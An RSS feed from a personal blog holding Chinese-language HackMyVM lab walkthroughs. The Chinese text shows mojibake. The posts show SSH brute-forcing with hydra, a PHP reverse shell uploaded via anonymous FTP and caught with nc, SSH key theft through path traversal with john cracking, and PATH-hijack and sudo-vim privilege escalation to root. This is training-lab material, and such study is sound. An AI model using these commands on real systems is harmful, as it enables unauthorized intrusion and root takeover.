<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Blog Title</title><link>https://7r1UMPH.github.io</link><description>Blog description</description><copyright>Blog Title</copyright><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><image><url>https://github.githubassets.com/favicons/favicon.svg</url><title>avatar</title><link>https://7r1UMPH.github.io</link></image><lastBuildDate>Thu, 20 Mar 2025 08:10:10 +0000</lastBuildDate><managingEditor>Blog Title</managingEditor><ttl>60</ttl><webMaster>Blog Title</webMaster><item><title>hmv_hannah</title><link>https://7r1UMPH.github.io/post/hmv_hannah.html</link><description># hmv_hannah

# 0.ç®€ä»‹

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Hannah  
**éš¾åº¦**ï¼šç»¿è‰²  
**ç›®æ ‡ IP**ï¼š192.168.205.150  
**æœ¬æœº IP**ï¼š192.168.205.128

# 1.æ‰«æ

â€‹`nmap`â€‹èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -A -Pn -n --min-rate 10000 192.168.205.150
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 16:07 CST
Nmap scan report for 192.168.205.150
Host is up (0.00031s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5f:1c:78:36:99:05:32:09:82:d3:d5:05:4c:14:75:d1 (RSA)
|   256 06:69:ef:97:9b:34:d7:f3:c7:96:60:d1:a1:ff:d8:2c (ECDSA)
|_  256 85:3d:da:74:b2:68:4e:a6:f7:e5:f5:85:40:90:2e:9a (ED25519)
|_auth-owners: root
80/tcp  open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-robots.txt: 1 disallowed entry 
|_/enlightenment
|_http-title: Site doesn't have a title (text/html).
|_auth-owners: moksha
113/tcp open  ident?
|_auth-owners: root
MAC Address: 08:00:27:7C:E4:91 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.31 ms 192.168.205.150

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.58 seconds
                                                   
```

113æœªçŸ¥ç«¯å£ï¼Œä¼˜å…ˆæŸ¥çœ‹

# 2.è¸©ç‚¹

https://book.hacktricks.wiki/zh/network-services-pentesting/113-pentesting-ident.html#basic-information

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ curl http://192.168.205.150:113                                                                       
curl: (56) Recv failure: è¿æ¥è¢«å¯¹æ–¹é‡ç½®
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nc 192.168.205.150 113 
hello 
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nc -vn 192.168.205.150 113
(UNKNOWN) [192.168.205.150] 113 (auth) open
hello
                            

â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ident-user-enum 192.168.205.150 80 22 113
ident-user-enum v1.0 ( http://pentestmonkey.net/tools/ident-user-enum )

192.168.205.150:80      moksha
192.168.205.150:22      root
192.168.205.150:113     root
                               
```

æœ‰ä¸€ä¸ªmokshaç”¨æˆ·ï¼Œæˆ‘ä»¬å°è¯•çˆ†ç ´ssh

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ hydra -l moksha -P /usr/share/wordlists/q5000.txt ssh://192.168.205.150 -V -I -u -f -e nsr -t 64

Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-08 16:23:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 5003 login tries (l:1/p:5003), ~79 tries per task
[DATA] attacking ssh://192.168.205.150:22/
[22][ssh] host: 192.168.205.150   login: moksha   password: hannah
[STATUS] attack finished for 192.168.205.150 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-08 16:23:44

```

æˆ‘ç¬¬ä¸€æ¬¡çˆ†ç ´çš„æ—¶å€™æ²¡å‡ºæ¥ï¼ŒçœŸçš„æœ‰ç‚¹æ— è¯­

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh moksha@192.168.205.150    
moksha@192.168.205.150's password: 
Linux hannah 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan  4 10:45:54 2023 from 192.168.1.51
moksha@hannah:~$ id
uid=1000(moksha) gid=1000(moksha) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.ææƒ

```
moksha@hannah:~$ sudo -l
-bash: sudo: orden no encontrada
moksha@hannah:~$ which sudo
moksha@hannah:~$ find / -name sudo 2&gt;/dev/null
/usr/share/bash-completion/completions/sudo
moksha@hannah:~$ /usr/share/bash-completion/completions/sudo -l
-bash: /usr/share/bash-completion/completions/sudo: Permiso denegado
moksha@hannah:~$ ls -la /usr/share/bash-completion/completions/sudo
-rw-r--r-- 1 root root 1504 ago 12  2020 /usr/share/bash-completion/completions/sudo

```

æˆ‘è¿˜ä»¥ä¸ºåˆè—sudoå‘¢

```
moksha@hannah:~$ ls -la
total 32
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .
drwxr-xr-x 3 root   root   4096 ene  4  2023 ..
lrwxrwxrwx 1 moksha moksha    9 ene  4  2023 .bash_history -&gt; /dev/null
-rw-r--r-- 1 moksha moksha  220 ene  4  2023 .bash_logout
-rw-r--r-- 1 moksha moksha 3526 ene  4  2023 .bashrc
drwxr-xr-x 3 moksha moksha 4096 ene  4  2023 .local
-rw-r--r-- 1 moksha moksha  807 ene  4  2023 .profile
-rw------- 1 moksha moksha   14 ene  4  2023 user.txt
-rw------- 1 moksha moksha   52 ene  4  2023 .Xauthority
moksha@hannah:~$ cd ..
moksha@hannah:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 ene  4  2023 .
drwxr-xr-x 18 root   root   4096 ene  4  2023 ..
drwxr-xr-x  3 moksha moksha 4096 ene  4  2023 moksha
moksha@hannah:/home$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
moksha@hannah:/home$ /sbin/getcap -r / 2&gt;/dev/null
/usr/bin/ping cap_net_raw=ep
moksha@hannah:/home$ cat /etc/cron*
cat: /etc/cron.d: Es un directorio
cat: /etc/cron.daily: Es un directorio
cat: /etc/cron.hourly: Es un directorio
cat: /etc/cron.monthly: Es un directorio
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/media:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
* * * * * root touch /tmp/enlIghtenment
17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Es un directorio

moksha@hannah:/tmp$ which touch
/usr/bin/touch

moksha@hannah:/tmp$ ls -la /media
total 12
drwxrwxrwx  3 root root 4096 ene  4  2023 .
drwxr-xr-x 18 root root 4096 ene  4  2023 ..
lrwxrwxrwx  1 root root    6 ene  4  2023 cdrom -&gt; cdrom0
drwxr-xr-x  2 root root 4096 ene  4  2023 cdrom0

```

æœ‰ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒçš„ç¯å¢ƒå˜é‡ä¹Ÿæœ‰é—®é¢˜ï¼Œæ‰€ä»¥

```
moksha@hannah:/tmp$ echo 'cp /bin/bash /tmp/sh;chmod u+s /tmp/sh' &gt; /media/touch
moksha@hannah:/tmp$ ls /tmp/
enlIghtenment
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ chmod +x /media/touch

```

ç­‰å­å¼¹é£ä¸€ä¼š

```
moksha@hannah:/tmp$ ls
enlIghtenment  systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-logind.service-Bwv8Xg
sh             systemd-private-7e7d884382b944e89570ebdfb081124b-systemd-timesyncd.service-S60g6e
moksha@hannah:/tmp$ ./sh -p
sh-5.1# id
uid=1000(moksha) gid=1000(moksha) euid=0(root) grupos=1000(moksha),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

â€ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_hannah.html</guid><pubDate>Thu, 20 Mar 2025 08:09:46 +0000</pubDate></item><item><title>hmv_friendly</title><link>https://7r1UMPH.github.io/post/hmv_friendly.html</link><description># hmv_friendly

# 0.ç®€ä»‹

**é¶æœº**ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Friendly  
**éš¾åº¦**ï¼šç»¿è‰²  
**ç›®æ ‡ IP**ï¼š192.168.205.129  
**æœ¬æœº IP**ï¼š192.168.205.128

# 1.æ‰«æ

â€‹`nmap`â€‹èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sT -Pn -n -p- --min-rate 10000 192.168.205.129  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-03 12:26 CST
Nmap scan report for 192.168.205.129
Host is up (0.00059s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.10 seconds

```

# 2.è¸©ç‚¹

å…ˆè¿›è¡ŒftpåŒ¿åç™»å½•

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ftp 192.168.205.129
Connected to 192.168.205.129.
220 ProFTPD Server (friendly) [::ffff:192.168.205.129]
Name (192.168.205.129:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||17885|)
150 Opening ASCII mode data connection for file list
drwxrwxrwx   2 root     root         4096 Mar 11  2023 .
drwxrwxrwx   2 root     root         4096 Mar 11  2023 ..
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html

```

å’Œæˆ‘ä»¬å‘ç°çš„ç½‘é¡µç›®å½•æ¶æ„ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•ä¸Šä¼ ä¸€ä¸ªåå¼¹shellä¸Šå»è®¿é—®

```
ftp&gt; put php.php 
local: php.php remote: php.php
229 Entering Extended Passive Mode (|||22559|)
150 Opening BINARY mode data connection for php.php
100% |*****************************************************************************************|  2596      255.89 KiB/s    00:00 ETA
226 Transfer complete
2596 bytes sent in 00:00 (241.58 KiB/s)
ftp&gt; ls
229 Entering Extended Passive Mode (|||7798|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 root     root        10725 Feb 23  2023 index.html
-rw-r--r--   1 ftp      nogroup      2596 Feb  3 04:32 php.php
226 Transfer complete

```

è®¿é—®

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.129] 35158
Linux friendly 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64 GNU/Linux
 23:33:07 up 7 min,  0 users,  load average: 1.36, 6.63, 3.71
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (439): Inappropriate ioctl for device
bash: no job control in this shell

```

# 3. è·å¾—ç¨³å®šçš„ Shell

è·å–**åå‘ shell** åï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å¾—ç¨³å®šçš„**äº¤äº’å¼** **TTY shell**ï¼š

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ææƒ

```
www-data@friendly:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Mar 11  2023 .
drwxr-xr-x  18 root root  4096 Mar 11  2023 ..
lrwxrwxrwx   1 root root     7 Feb 21  2023 bin -&gt; usr/bin
drwxr-xr-x   3 root root  4096 Feb 21  2023 boot
drwxr-xr-x  17 root root  3140 Feb  2 23:26 dev
drwxr-xr-x  69 root root  4096 Feb  2 23:26 etc
drwxr-xr-x   3 root root  4096 Feb 21  2023 home
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img -&gt; boot/initrd.img-5.10.0-21-amd64
lrwxrwxrwx   1 root root    31 Feb 21  2023 initrd.img.old -&gt; boot/initrd.img-5.10.0-18-amd64
lrwxrwxrwx   1 root root     7 Feb 21  2023 lib -&gt; usr/lib
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib32 -&gt; usr/lib32
lrwxrwxrwx   1 root root     9 Feb 21  2023 lib64 -&gt; usr/lib64
lrwxrwxrwx   1 root root    10 Feb 21  2023 libx32 -&gt; usr/libx32
drwx------   2 root root 16384 Feb 21  2023 lost+found
drwxr-xr-x   3 root root  4096 Feb 21  2023 media
drwxr-xr-x   2 root root  4096 Feb 21  2023 mnt
drwxr-xr-x   2 root root  4096 Feb 21  2023 opt
dr-xr-xr-x 145 root root     0 Feb  2 23:26 proc
drwx------   3 root root  4096 Mar 11  2023 root
drwxr-xr-x  17 root root   540 Feb  2 23:26 run
lrwxrwxrwx   1 root root     8 Feb 21  2023 sbin -&gt; usr/sbin
drwxr-xr-x   2 root root  4096 Mar 11  2023 srv
dr-xr-xr-x  13 root root     0 Feb  2 23:26 sys
drwxrwxrwt   2 root root  4096 Feb  2 23:26 tmp
drwxr-xr-x  14 root root  4096 Feb 21  2023 usr
drwxr-xr-x  12 root root  4096 Feb 21  2023 var
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz -&gt; boot/vmlinuz-5.10.0-21-amd64
lrwxrwxrwx   1 root root    28 Feb 21  2023 vmlinuz.old -&gt; boot/vmlinuz-5.10.0-18-amd64
www-data@friendly:/$ sudo -l
Matching Defaults entries for www-data on friendly:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on friendly:
    (ALL : ALL) NOPASSWD: /usr/bin/vim

```

![image](assets/image-20250203123641-1hov8b3.png)

ğŸ”—https://gtfobins.github.io/gtfobins/vim/#sudo

```
www-data@friendly:/$ sudo vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)

```ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly.html</guid><pubDate>Thu, 20 Mar 2025 08:08:45 +0000</pubDate></item><item><title>hmv_friendly2</title><link>https://7r1UMPH.github.io/post/hmv_friendly2.html</link><description># hmv_friendly2

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - friendly2](https://hackmyvm.eu/machines/machine.php?vm=friendly2)
**éš¾åº¦**ï¼šç»¿è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.138
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-24 09:37 CST
Nmap scan report for 192.168.205.138
Host is up (0.00057s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:0C:8F:A4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

# 2.è¸©ç‚¹

![Image](https://github.com/user-attachments/assets/0db9dabd-fe97-4b10-ac8c-fea7bb327606)

å°è¯•çˆ†ç ´ç›®å½•

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ feroxbuster -u 'http://192.168.205.138' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md
                                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben 'epi' Risher ğŸ¤“                 ver: 2.11.0
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ¯  Target Url            â”‚ http://192.168.205.138
 ğŸš€  Threads               â”‚ 50
 ğŸ“–  Wordlist              â”‚ /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
 ğŸ‘Œ  Status Codes          â”‚ All Status Codes!
 ğŸ’¥  Timeout (secs)        â”‚ 7
 ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0
 ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml
 ğŸ”  Extract Links         â”‚ true
 ğŸ’²  Extensions            â”‚ [php, html, txt, md]
 ğŸ  HTTP methods          â”‚ [GET]
 ğŸ”ƒ  Recursion Depth       â”‚ 4
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter                                                                                                                                   
200      GET       91l      262w     2698c http://192.168.205.138/
301      GET        9l       28w      319c http://192.168.205.138/assets =&gt; http://192.168.205.138/assets/
301      GET        9l       28w      318c http://192.168.205.138/tools =&gt; http://192.168.205.138/tools/
200      GET       91l      262w     2698c http://192.168.205.138/index.html
200      GET     1710l     9966w   851305c http://192.168.205.138/assets/keyboard.png
200      GET      644l     3260w   244133c http://192.168.205.138/assets/monitor.png
200      GET     1965l    11601w   977099c http://192.168.205.138/assets/laptop.png
200      GET       24l      148w     6861c http://192.168.205.138/assets/sirena.gif
301      GET        9l       28w      328c http://192.168.205.138/tools/documents =&gt; http://192.168.205.138/tools/documents/
200      GET       29l       99w      813c http://192.168.205.138/tools/index.html
200      GET       35l      101w      841c http://192.168.205.138/tools/documents/monitor.html
200      GET       50l      126w     1169c http://192.168.205.138/tools/documents/keyboard.html
200      GET       35l      101w      879c http://192.168.205.138/tools/documents/laptop.html
[####################] - 2m    622895/622895  0s      found:13      errors:1      
[####################] - 2m    311410/311410  2719/s  http://192.168.205.138/ 
[####################] - 2s    311410/311410  184157/s http://192.168.205.138/assets/ =&gt; Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    311410/311410  2662/s  http://192.168.205.138/tools/ 
[####################] - 0s    311410/311410  7077500/s http://192.168.205.138/tools/documents/ =&gt; Directory listing (add --scan-dir-listings to scan)
```

å…¶ä¸­`/tools/`ç›®å½•ï¼Œæˆ‘ä»¬æ¯”è¾ƒæ„Ÿå…´è¶£

![Image](https://github.com/user-attachments/assets/4cecf106-19df-416e-b3c1-2da93f1dcbf6)

æœ‰ä¸€ä¸ªç–‘ä¼¼ç›®å½•åŒ…å«è·¯å¾„ï¼Œæˆ‘ä»¬åŠ ä¸Šå°è¯•

![Image](https://github.com/user-attachments/assets/07421b64-12cb-4fe0-b6e8-48f94239bddc)

å†å°è¯•å¯ä¸å¯ä»¥ä½¿ç”¨**PHP è¿‡æ»¤å™¨é“¾**

![Image](https://github.com/user-attachments/assets/0788d850-d370-4605-9661-192ba52e50bb)

ä¸è¡Œï¼Œé‚£æˆ‘ä»¬è¿˜æ˜¯å»è¯»å®ƒå¯†é’¥å§

![Image](https://github.com/user-attachments/assets/286bfaa9-f0e2-4543-9ce7-711916d35160)

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ vim id_rsa 
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ chmod 600 id_rsa
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh gh0st@192.168.205.138 -i id_rsa
The authenticity of host '192.168.205.138 (192.168.205.138)' can't be established.
ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.138' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh2john id_rsa &gt; hash                             
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ john hash --show                                   
id_rsa:celtic

1 password hash cracked, 0 left
                                                                                                                                    
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ ssh gh0st@192.168.205.138 -i id_rsa                
Enter passphrase for key 'id_rsa': 
Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gh0st@friendly2:~$ id
uid=1001(gh0st) gid=1001(gh0st) groups=1001(gh0st)

```

# 3.ææƒ

```bash
gh0st@friendly2:~$ sudo -l
Matching Defaults entries for gh0st on friendly2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gh0st may run the following commands on friendly2:
    (ALL : ALL) SETENV: NOPASSWD: /opt/security.sh
gh0st@friendly2:~$ cat /opt/security.sh
#!/bin/bash

echo 'Enter the string to encode:'
read string

# Validate that the string is no longer than 20 characters
if [[ ${#string} -gt 20 ]]; then
  echo 'The string cannot be longer than 20 characters.'
  exit 1
fi

# Validate that the string does not contain special characters
if echo '$string' | grep -q '[^[:alnum:] ]'; then
  echo 'The string cannot contain special characters.'
  exit 1
fi

sus1='A-Za-z'
sus2='N-ZA-Mn-za-m'

encoded_string=$(echo '$string' | tr $sus1 $sus2)

echo 'Original string: $string'
echo 'Encoded string: $encoded_string'
gh0st@friendly2:~$ ls -la /opt/
total 16
drwxr-xr-x  3 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
drwxr-xr-x  2 root root 4096 Apr 29  2023 0-day
-rwxr-xr-x  1 root root  561 Apr 29  2023 security.sh

```

å®ç°ç”¨æˆ·è¾“å…¥ä¸è¶…20ä¸ªå­—ç¬¦ä¸”ä¸èƒ½æœ‰ç‰¹æ®Šç¬¦å·ï¼Œå°†è¾“å…¥ä¿¡æ¯ROT13 ç¼–ç ï¼Œæˆ‘ä»¬æ”¹ä¸ªç¯å¢ƒå˜é‡å°±å¥½äº†ï¼Œå®ƒæ²¡ç”¨ç»å¯¹è·¯å¾„

```bash
gh0st@friendly2:/tmp$ echo 'chmod u+s /bin/bash' &gt; grep
gh0st@friendly2:/tmp$ chmod +x grep 
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ sudo PATH=$PWD:$PATH /opt/security.sh
Enter the string to encode:
aaassss
The string cannot contain special characters.
gh0st@friendly2:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
gh0st@friendly2:/tmp$ bash -p
bash-5.1# id
uid=1001(gh0st) gid=1001(gh0st) euid=0(root) groups=1001(gh0st)
bash-5.1# cat /root/
.bash_history  .bashrc        interfaces.sh  .local/        .profile       root.txt     
bash-5.1# cat /root/root.txt 
Not yet! Try to find root.txt.


Hint: ...
bash-5.1# find / -name '...' 2&gt;/dev/null
/...
bash-5.1# cd /.../
bash-5.1# ls -al
total 12
d-wx------  2 root root 4096 Apr 29  2023 .
drwxr-xr-x 19 root root 4096 Apr 27  2023 ..
-r--------  1 root root  100 Apr 29  2023 ebbg.txt
bash-5.1# cat ebbg.txt 
It's codified, look the cipher:

98199n723q0s44s6rs39r33685q8pnoq



Hint: numbers are not codified

```

![Image](https://github.com/user-attachments/assets/f1d96202-91e2-4915-adb2-fd428994419b)ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_friendly2.html</guid><pubDate>Thu, 20 Mar 2025 08:07:44 +0000</pubDate></item><item><title>hmv_flossy</title><link>https://7r1UMPH.github.io/post/hmv_flossy.html</link><description># hmv_flossy

# 0.ç®€ä»‹

**é¶æœº**ï¼š[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)
**éš¾åº¦**ï¼šé»„è‰²
**ç›®æ ‡ IP**ï¼š192.168.205.138
**æœ¬æœº IP**ï¼š192.168.205.141

# 1.æ‰«æ

`nmap`èµ·æ‰‹

```bash
â”Œâ”€â”€(kaliã‰¿kali)-[~/test]
â””â”€$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST
Nmap scan report for 192.168.205.138
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds

```

å…ˆçœ‹**80ç«¯å£**ï¼Œ**22ç«¯å£**å€™è¡¥

# 2.è¸©ç‚¹

![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)

ä¸€ä¸ªæŸ¥è¯¢é¡µé¢ï¼Œå¯ä»¥è¾“å…¥æ•°å€¼è¿›è¡ŒæŸ¥è¯¢ï¼Œæœ‰æ•ˆèŒƒå›´æ˜¯**1-99**ï¼Œåé¢çš„æ•°æ®æ˜¯é‡å¤çš„ã€‚</description><guid isPermaLink="true">https://7r1UMPH.github.io/post/hmv_flossy.html</guid><pubDate>Thu, 20 Mar 2025 08:06:41 +0000</pubDate></item><item><title>hmv_espo</title><link>https://7r1UMPH.github.io/post/hmv_espo.html</link><description># hmv_espo

# 0.ç®€ä»‹

